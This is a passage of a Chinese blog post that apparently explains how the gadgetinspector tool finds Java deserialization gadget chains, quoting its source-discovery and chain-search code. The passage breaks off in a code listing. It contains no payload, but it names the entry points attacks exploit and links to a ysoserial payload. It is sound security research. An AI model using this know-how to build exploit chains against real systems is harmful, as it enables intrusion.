 passthroughDataflow.put(method, cv.getReturnTaint());<span class="comment">//将判定后的method与有关系的污染点加入passthroughDataflow</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">"Exception analyzing "</span> + method.getClassReference().getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">"Unable to analyze "</span> + method.getClassReference().getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>最后生成了passthrough.dat：</p><table><thead><tr><th>类名</th><th>方法名</th><th>方法描述</th><th>污点</th></tr></thead><tbody><tr><td>java/util/Collections$CheckedNavigableSet</td><td>tailSet</td><td>(Ljava/lang/Object;)Ljava/util/NavigableSet;</td><td>0,1</td></tr><tr><td>java/awt/RenderingHints</td><td>put</td><td>(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;</td><td>0,1,2</td></tr></tbody></table><h4 id="Step3-枚举passthrough调用图"><a href="#Step3-枚举passthrough调用图" class="headerlink" title="Step3  枚举passthrough调用图"></a>Step3  枚举passthrough调用图</h4><p>这一步和上一步类似，gadgetinspector 会再次扫描全部的Java方法，但检查的不再是参数与返回结果的关系，而是方法的参数与其所调用的子方法的关系，即子方法的参数是否可以被父方法的参数所影响。那么为什么要进行上一步的生成passthrough数据流呢？由于这一步的判断也是在字节码分析中，所以这里只能先进行一些猜测，如下面这个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">private</span> MyObject obj;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parentMethod</span><span class="params">(Object arg)</span></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        TestObject obj1 = <span class="keyword">new</span> TestObject();</span><br><span class="line">        Object obj2 = obj1.childMethod1(arg);</span><br><span class="line">        <span class="keyword">this</span>.obj.childMethod(obj2); </span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果不进行生成passthrough数据流操作，就无法判断TestObject.childMethod1的返回值是否会受到参数1的影响，也就无法继续判断parentMethod的arg参数与子方法MyObject.childmethod的参数传递关系。</p><p>作者给出的例子：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/23.png" alt=""></p><p>AbstractTableModel$ff19274a.hashcode与子方法IFn.invoke：</p><ul><li>AbstractTableModel$ff19274a.hashcode的this(0参)传递给了IFn.invoke的1参，表示为0-&gt;IFn.invoke()@1</li><li>由于f是通过this.__clojureFnMap(0参)获取的，而f又为IFn.invoke()的this(0参)，即AbstractTableModel$ff19274a.hashcode的0参传递给了IFn.invoke的0参，表示为0-&gt;IFn.invoke()@0</li></ul><p>FnCompose.invoke与子方法IFn.invoke：</p><ul><li>FnCompose.invoked的arg(1参)传递给了IFn.invoke的1参，表示为1-&gt;IFn.invoke()@1</li><li>f1为FnCompose的属性(this，0参)，被做为了IFn.invoke的this(0参数)传递，表示为0-&gt;IFn.invoke()@1</li><li>f1.invoke(arg)做为一个整体被当作1参传递给了IFn.invoke，由于f1在序列化时我们可以控制具体是IFn的哪个实现类，所以具体调用哪个实现类的invoke也相当于能够控制，即f1.invoke(arg)这个整体可以视为0参数传递给了IFn.invoke的1参(这里只是进行的简单猜测，具体实现在字节码分析中，可能也体现了作者说的合理的风险判断吧)，表示为0-&gt;IFn.invoke()@1</li></ul><p>在这一步中，gadgetinspector也是利用ASM来进行字节码的分析，主要逻辑是在类CallGraphDiscovery和ModelGeneratorClassVisitor中。在ModelGeneratorClassVisitor中通过标记追踪JVM虚拟机在执行方法时的stack和localvar，最终得到方法的参数与其所调用的子方法的参数传递关系。</p><p>生成passthrough调用图代码（暂时省略ModelGeneratorClassVisitor的实现，涉及到字节码分析）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallGraphDiscovery</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(CallGraphDiscovery.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;GraphCall&gt; discoveredCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, GIConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();<span class="comment">//加载所有方法</span></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();<span class="comment">//加载所有类</span></span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();<span class="comment">//加载继承图</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load();<span class="comment">//加载passthrough数据流</span></span><br><span class="line"></span><br><span class="line">        SerializableDecider serializableDecider = config.getSerializableDecider(methodMap, inheritanceMap);<span class="comment">//序列化决定器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123;</span><br><span class="line">                ClassReader cr = <span class="keyword">new</span> ClassReader(in);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cr.accept(<span class="keyword">new</span> ModelGeneratorClassVisitor(classMap, inheritanceMap, passthroughDataflow, serializableDecider, Opcodes.ASM6),</span><br><span class="line">                            ClassReader.EXPAND_FRAMES);<span class="comment">//通过结合classMap、inheritanceMap、passthroughDataflow结果、序列化决定器信息来判定当前method参数与子方法传递调用关系</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">"Error analyzing: "</span> + classResource.getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后生成了passthrough.dat：</p><table><thead><tr><th>父方法类名</th><th>父方法</th><th>父方法描述</th><th>子方法类名</th><th>子方法子</th><th>方法描述</th><th>父方法第几参</th><th>参数对象的哪个field被传递</th><th>子方法第几参</th></tr></thead><tbody><tr><td>java/io/PrintStream</td><td>write</td><td>(Ljava/lang/String;)V</td><td>java/io/OutputStream</td><td>flush</td><td>()V</td><td>0</td><td>out</td><td>0</td></tr><tr><td>javafx/scene/shape/Shape</td><td>setSmooth</td><td>(Z)V</td><td>javafx/scene/shape/Shape</td><td>smoothProperty</td><td>()Ljavafx/beans/property/BooleanProperty;</td><td>0</td><td></td><td>0</td></tr></tbody></table><hr><h4 id="Step4-搜索可用的source"><a href="#Step4-搜索可用的source" class="headerlink" title="Step4 搜索可用的source"></a>Step4 搜索可用的source</h4><p>这一步会根据已知的反序列化漏洞的入口，检查所有可以被触发的方法。例如，在利用链中使用代理时，任何可序列化并且是<code>java/lang/reflect/InvocationHandler</code>子类的invoke方法都可以视为source。这里还会根据具体的反序列化库决定类是否能被序列化。</p><p>搜索可用的source：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleSourceDiscovery</span> <span class="keyword">extends</span> <span class="title">SourceDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> SerializableDecider serializableDecider = <span class="keyword">new</span> SimpleSerializableDecider(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"finalize"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"()V"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果类实现了readObject，则传入的ObjectInputStream被认为是污染的</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"readObject"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"(Ljava/io/ObjectInputStream;)V"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用代理技巧时，任何扩展了serializable and InvocationHandler的类会受到污染。</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> ClassReference.Handle(<span class="string">"java/lang/reflect/InvocationHandler"</span>))) &#123;</span><br><span class="line">                MethodReference.Handle method = <span class="keyword">new</span> MethodReference.Handle(</span><br><span class="line">                        clazz, <span class="string">"invoke"</span>, <span class="string">"(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;"</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode（）或equals（）是将对象放入HashMap的标准技巧的可访问入口点</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"hashCode"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"()I"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"equals"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"(Ljava/lang/Object;)Z"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用比较器代理，可以跳转到任何groovy Closure的call()/doCall()方法，所有的args都被污染</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"groovy/lang/Closure"</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">"call"</span>) || method.getName().equals(<span class="string">"doCall"</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这一步的结果会保存在文件sources.dat中:</p><table><thead><tr><th>类</th><th>方法</th><th>方法描述</th><th>污染参数</th></tr></thead><tbody><tr><td>java/awt/color/ICC_Profile</td><td>finalize</td><td>()V</td><td>0</td></tr><tr><td>java/lang/Enum</td><td>readObject</td><td>(Ljava/io/ObjectInputStream;)V</td><td>1</td></tr></tbody></table><h4 id="Step5-搜索生成调用链"><a href="#Step5-搜索生成调用链" class="headerlink" title="Step5 搜索生成调用链"></a>Step5 搜索生成调用链</h4><p>这一步会遍历全部的source，并在callgraph.dat中递归查找所有可以继续传递污点参数的子方法调用，直至遇到sink中的方法。</p><p>搜索生成调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GadgetChainDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(GadgetChainDiscovery.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> GIConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GadgetChainDiscovery</span><span class="params">(GIConfig config)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.config = config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">                inheritanceMap, methodMap);<span class="comment">//得到方法的所有子类方法实现（被子类重写的方法）</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ImplementationFinder implementationFinder = config.getImplementationFinder(</span><br><span class="line">                methodMap, methodImplMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将方法的所有子类方法实现保存到methodimpl.dat</span></span><br><span class="line">        <span class="keyword">try</span> (Writer writer = Files.newBufferedWriter(Paths.get(<span class="string">"methodimpl.dat"</span>))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">                writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                writer.write(entry.getKey().getName());</span><br><span class="line">                writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                writer.write(entry.getKey().getDesc());</span><br><span class="line">                writer.write(<span class="string">"\n"</span>);</span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getClassReference().getName());</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getName());</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getDesc());</span><br><span class="line">                    writer.write(<span class="string">"\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法调用map，key为父方法，value为子方法与父方法参数传递关系</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">"callgraph.dat"</span>), <span class="keyword">new</span> GraphCall.Factory())) &#123;</span><br><span class="line">            MethodReference.Handle caller = graphCall.getCallerMethod();</span><br><span class="line">            <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">                Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                graphCalls.add(graphCall);</span><br><span class="line">                graphCallMap.put(caller, graphCalls);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                graphCallMap.get(caller).add(graphCall);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exploredMethods保存在调用链从查找过程中已经访问过的方法节点，methodsToExplore保存调用链</span></span><br><span class="line">        Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="comment">//加载所有sources，并将每个source作为每条链的第一个节点</span></span><br><span class="line">        <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">"sources.dat"</span>), <span class="keyword">new</span> Source.Factory())) &#123;</span><br><span class="line">            GadgetChainLink srcLink = <span class="keyword">new</span> GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">            <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            methodsToExplore.add(<span class="keyword">new</span> GadgetChain(Arrays.asList(srcLink)));</span><br><span class="line">            exploredMethods.add(srcLink);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> iteration = <span class="number">0</span>;</span><br><span class="line">        Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="comment">//使用广度优先搜索所有从source到sink的调用链</span></span><br><span class="line">        <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                LOGGER.info(<span class="string">"Iteration "</span> + iteration + <span class="string">", Search space: "</span> + methodsToExplore.size());</span><br><span class="line">            &#125;</span><br><span class="line">            iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            GadgetChain chain = methodsToExplore.pop();<span class="comment">//从队首弹出一条链</span></span><br><span class="line">            GadgetChainLink lastLink = chain.links.get(chain.links.size()-<span class="number">1</span>);<span class="comment">//取这条链最后一个节点</span></span><br><span class="line"></span><br><span class="line">            Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);<span class="comment">//获取当前节点方法所有子方法与当前节点方法参数传递关系</span></span><br><span class="line">            <span class="keyword">if</span> (methodCalls != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                        <span class="comment">//如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());<span class="comment">//获取子方法所在类的所有子类重写方法</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                        GadgetChainLink newLink = <span class="keyword">new</span> GadgetChainLink(methodImpl, graphCall.getTargetArgIndex());<span class="comment">//新方法节点</span></span><br><span class="line">                        <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                            <span class="comment">//如果新方法已近被访问过了，则跳过,这里能减少开销。但是这一步跳过会使其他链/分支链经过此节点时，由于已经此节点被访问过了，链会在这里断掉。那么如果这个条件去掉就能实现找到所有链了吗？这里去掉会遇到环状问题，造成路径无限增加...</span></span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        GadgetChain newChain = <span class="keyword">new</span> GadgetChain(chain, newLink);<span class="comment">//新节点与之前的链组成新链</span></span><br><span class="line">                        <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;<span class="comment">//如果到达了sink，则加入discoveredGadgets</span></span><br><span class="line">                            discoveredGadgets.add(newChain);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//新链加入队列</span></span><br><span class="line">                            methodsToExplore.add(newChain);</span><br><span class="line">                            <span class="comment">//新节点加入已访问集合</span></span><br><span class="line">                            exploredMethods.add(newLink);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//保存搜索到的利用链到gadget-chains.txt</span></span><br><span class="line">        <span class="keyword">try</span> (OutputStream outputStream = Files.newOutputStream(Paths.get(<span class="string">"gadget-chains.txt"</span>));</span><br><span class="line">             Writer writer = <span class="keyword">new</span> OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">                printGadgetChain(writer, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOGGER.info(<span class="string">"Found &#123;&#125; gadget chains."</span>, discoveredGadgets.size());</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>作者给出的sink方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 